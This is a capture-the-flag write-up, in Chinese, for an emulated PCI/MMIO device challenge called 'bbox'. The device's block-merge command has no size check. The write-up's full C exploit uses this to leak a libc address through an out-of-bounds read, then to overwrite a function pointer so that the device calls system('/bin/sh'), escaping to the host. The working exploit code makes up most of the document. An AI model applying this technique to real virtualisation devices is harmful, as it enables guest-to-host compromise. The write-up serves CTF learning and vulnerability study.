# bbox

## 题目简述

题目是 PCI/MMIO 设备交互。`merge` 操作没有正确检查合并后的 size，既能越界读也能越界写，最终覆盖设备/宿主侧指针并让一次可控调用落到 `system("/bin/sh")`。

## 解题过程

### 关键观察

题目是 PCI/MMIO 设备交互。

### 求解步骤

merge操作没check size，导致越界读。
同时merge也没check越界写，写掉指针，rdi可控的任意call
exp跑两次就通了，或者多写一次，懒得改了:)
#include <stdint.h>
#include <stddef.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
/* ==== MMIO 基础信息 ==== */

#define VIRTSEC_BAR_SIZE      0x2000
#define VIRTSEC_DATA_BASE     0x1000  /* 0x1000~0x1FFF: 数据窗口 */

/* ==== 寄存器偏移（低 0x1000） ==== */

#define VIRTSEC_REG_MAGIC       0x00    /* 固定 0x524F4953 */
#define VIRTSEC_REG_MAX_SIZE    0x04    /* 固定 256 */
#define VIRTSEC_REG_STATE       0x08    /* session_state */
#define VIRTSEC_REG_CMD         0x0C    /* 写入触发命令 */
#define VIRTSEC_REG_SESSION_ID  0x10
#define VIRTSEC_REG_CUR_BLK_ID  0x14
#define VIRTSEC_REG_BLOCK_SIZE  0x18
#define VIRTSEC_REG_READ_OFFSET 0x1C
#define VIRTSEC_REG_ERROR_CODE  0x20
#define VIRTSEC_REG_BLOCK_COUNT 0x24
#define VIRTSEC_REG_CNT1_LO     0x28
#define VIRTSEC_REG_CNT2_LO     0x2C
#define VIRTSEC_REG_MERGE_ID1   0x30
#define VIRTSEC_REG_MERGE_ID2   0x34
#define VIRTSEC_REG_GIFT        0x38    /* 写任意值触发 gift */

/* ==== 命令号（virtsec_execute_command） ==== */

#define VIRTSEC_CMD_INIT_SESSION   1
#define VIRTSEC_CMD_ALLOC_BLOCK    2
#define VIRTSEC_CMD_PREPARE_READ   3
#define VIRTSEC_CMD_MERGE          4
#define VIRTSEC_CMD_RESET          6

void virtsec_set_mmio_base(volatile uint8_t *base);

/* 低级读写 32bit 寄存器 */
uint32_t virtsec_reg_read(uint32_t offset);
void     virtsec_reg_write(uint32_t offset, uint32_t value);

/* 高地址数据窗口读写（设备内部 block 数据区），按任意长度读写 */
void virtsec_data_write(uint32_t block_offset, const void *buf, size_t len);
void virtsec_data_read(uint32_t block_offset, void *buf, size_t len);

/* 直接写入命令寄存器（相当于调用 virtsec_execute_command） */
void virtsec_exec_cmd(uint32_t cmd);

/* 下面是几种常用操作的“语义级”封装 */

/* 1) 初始化会话 */
void virtsec_init_session(uint32_t session_id);

/* 2) 分配 block：设置 current_block_id + block_size 然后 CMD=2 */
void virtsec_alloc_block(uint32_t block_id, uint32_t size);

/* 3) 准备读某个 block：CMD=3 */
void virtsec_prepare_read(uint32_t block_id);

/* 4) 合并两个 block：设置 MERGE_ID1/2 然后 CMD=4 */
void virtsec_merge_blocks(uint32_t id1, uint32_t id2);

/* 5) 复位设备：CMD=6 */
void virtsec_reset(void);

/* 6) 触发 gift 调用：写 REG_GIFT 任意值 */
void virtsec_trigger_gift(void);

/* 7) 方便调试：一次性写/读整块数据（从 offset=0 开始） */
void virtsec_write_block_data(uint32_t block_id, const void *buf, size_t len);
void virtsec_read_block_data(uint32_t block_id, void *buf, size_t len);


/* 全局保存一份 MMIO 基地址 */
static volatile uint8_t *g_virtsec_mmio = NULL;

/* ===== 基础接口 ===== */
static void hexdump(const void *buf, size_t len) {
    const uint8_t *p = buf;
    for (size_t i = 0; i < len; i++) {
        if (i % 16 == 0) printf("%04zx: ", i);
        printf("%02x ", p[i]);
        if (i % 16 == 15 || i == len - 1) {
            printf("\n");
        }
    }
}

void virtsec_set_mmio_base(volatile uint8_t *base)
{
    g_virtsec_mmio = base;
}

static inline volatile uint8_t *virtsec_base(void)
{
    return g_virtsec_mmio;
}

uint32_t virtsec_reg_read(uint32_t offset)
{
    volatile uint8_t *mmio = virtsec_base();
    if (!mmio)
        return 0;  /* 或者 assert */

    return *(volatile uint32_t *)(mmio + offset);
}

void virtsec_reg_write(uint32_t offset, uint32_t value)
{
    volatile uint8_t *mmio = virtsec_base();
    if (!mmio)
        return;

    *(volatile uint32_t *)(mmio + offset) = value;
}

/* ===== 数据窗口读写（高地址 0x1000~0x1FFF） ===== */

void virtsec_data_write(uint32_t block_offset, const void *buf, size_t len)
{
    volatile uint8_t *mmio = virtsec_base();
    if (!mmio || !buf || len == 0)
        return;

    const uint8_t *p = (const uint8_t *)buf;
    size_t pos = 0;

    while (pos < len) {
        uint32_t off = VIRTSEC_DATA_BASE + block_offset + (uint32_t)pos;
        uint32_t word = 0;
        size_t remain = len - pos;
        size_t chunk = (remain >= 4) ? 4 : remain;

        /* 小端拼一个 32bit word 写进去 */
        memcpy(&word, p + pos, chunk);
        *(volatile uint32_t *)(mmio + off) = word;
        pos += chunk;
    }
}

void virtsec_data_read(uint32_t block_offset, void *buf, size_t len)
{
    volatile uint8_t *mmio = virtsec_base();
    if (!mmio || !buf || len == 0)
        return;

    uint8_t *p = (uint8_t *)buf;
    size_t pos = 0;

    while (pos < len) {
        uint32_t off = VIRTSEC_DATA_BASE + block_offset + (uint32_t)pos;
        uint32_t word = *(volatile uint32_t *)(mmio + off);
        size_t remain = len - pos;
        size_t chunk = (remain >= 4) ? 4 : remain;

        memcpy(p + pos, &word, chunk);
        pos += chunk;
    }
}

/* ===== 命令封装 ===== */

void virtsec_exec_cmd(uint32_t cmd)
{
    virtsec_reg_write(VIRTSEC_REG_CMD, cmd);
}

/* 初始化会话：CMD=1 */
void virtsec_init_session(uint32_t session_id)
{
    virtsec_reg_write(VIRTSEC_REG_SESSION_ID, session_id);
    virtsec_exec_cmd(VIRTSEC_CMD_INIT_SESSION);
}

/* 分配 block：设置 block_id + block_size 然后 CMD=2 */
void virtsec_alloc_block(uint32_t block_id, uint32_t size)
{
    /* 设备要求 1 <= size <= 0x10 */
    virtsec_reg_write(VIRTSEC_REG_CUR_BLK_ID, block_id);
    virtsec_reg_write(VIRTSEC_REG_BLOCK_SIZE, size);
    virtsec_exec_cmd(VIRTSEC_CMD_ALLOC_BLOCK);
}

/* 准备读 block：CMD=3（内部会检查 block 是否存在有效） */
void virtsec_prepare_read(uint32_t block_id)
{
    virtsec_reg_write(VIRTSEC_REG_CUR_BLK_ID, block_id);
    virtsec_exec_cmd(VIRTSEC_CMD_PREPARE_READ);
}

/* 合并两个 block：CMD=4 */
void virtsec_merge_blocks(uint32_t id1, uint32_t id2)
{
    virtsec_reg_write(VIRTSEC_REG_MERGE_ID1, id1);
    virtsec_reg_write(VIRTSEC_REG_MERGE_ID2, id2);
    virtsec_exec_cmd(VIRTSEC_CMD_MERGE);
}

/* 复位设备：CMD=6 */
void virtsec_reset(void)
{
    virtsec_exec_cmd(VIRTSEC_CMD_RESET);
}

/* 触发 gift：写 REG_GIFT 任意值即可 */
void virtsec_trigger_gift(void)
{
    virtsec_reg_write(VIRTSEC_REG_GIFT, 0xdeadbeef);
}

/* ===== 小工具：整块写/读便于上层用 ===== */

void virtsec_write_block_data(uint32_t block_id, const void *buf, size_t len)
{
    /* 上层需要自己保证 len 不超过当前 block 的 size（合并前最多 0x10） */
    virtsec_reg_write(VIRTSEC_REG_CUR_BLK_ID, block_id);
    virtsec_data_write(0, buf, len);
}

void virtsec_read_block_data(uint32_t block_id, void *buf, size_t len)
{
    virtsec_reg_write(VIRTSEC_REG_CUR_BLK_ID, block_id);
    virtsec_data_read(0, buf, len);
}

int main()
{
    int fd = open("/sys/bus/pci/devices/0000:00:04.0/resource0", O_RDWR |
O_SYNC);
    void *base = mmap(NULL, VIRTSEC_BAR_SIZE, PROT_READ | PROT_WRITE,
MAP_SHARED, fd, 0);
    virtsec_set_mmio_base((volatile uint8_t *)base);
    volatile uint8_t *mmio = virtsec_base();
    virtsec_alloc_block(0, 0x10);
    virtsec_alloc_block(1, 0x10);
    virtsec_merge_blocks(0, 1);//0x20
    // our target is 0x110
    for(int i = 0; i < (0x11-2); i++){
        virtsec_alloc_block(1, 0x10);
        virtsec_merge_blocks(0, 1);
    }

    char buf[0x1000];
    memset(buf,0,0x1000);
    virtsec_trigger_gift();
    virtsec_read_block_data(0, buf, 0x110);
    hexdump(buf, 0x110);
    uint64_t libc_base = *(uint64_t*)(buf+0x100) - 0x606f0;
    uint64_t system = libc_base + 0x50d70;
    uint64_t sh = libc_base + 0x1d8678;
    printf("libc_base = 0x%lx\n", libc_base);
    printf("system = 0x%lx\n", system);
    printf("sh = 0x%lx\n", sh);
    *(uint64_t*)(buf+0x100) = system;
    *(uint64_t*)(buf+0x108) = sh;
    virtsec_alloc_block(1, 0x10);
    virtsec_write_block_data(1, buf+0x100, 0x10);
    for(int i = 2; i < (0x10); i++){
        virtsec_alloc_block(i, 0x10);
        virtsec_write_block_data(i, buf+0x100, 0x10);
    }
    getchar();
    for(int i = 3; i < (0x10); i++){

### 跨页补回：MMIO exploit 收尾

virtsec_merge_blocks(0x2,i);
    }
    // virtsec_merge_blocks(0xf,0xf);
    // // virtsec_write_block_data(0xf, buf+0x100-0x14, 0x14);
    // virtsec_reg_write(VIRTSEC_REG_CUR_BLK_ID, 0xf);
    // *(volatile uint32_t *)(mmio + VIRTSEC_DATA_BASE + 0x10) =
system&0xffffffff;
    virtsec_read_block_data(0, buf, 0x110);
    hexdump(buf, 0x110);
    virtsec_trigger_gift();
    // getchar();

    return 0;
}

## 方法总结

- 核心技巧：设备命令越界合并造成 OOB read/write。
- 识别信号：MMIO 设备有 block 分配/合并接口，但合并后 size 未校验。
- 复用要点：先用越界读泄露基址，再用越界写覆盖函数指针或调用参数。
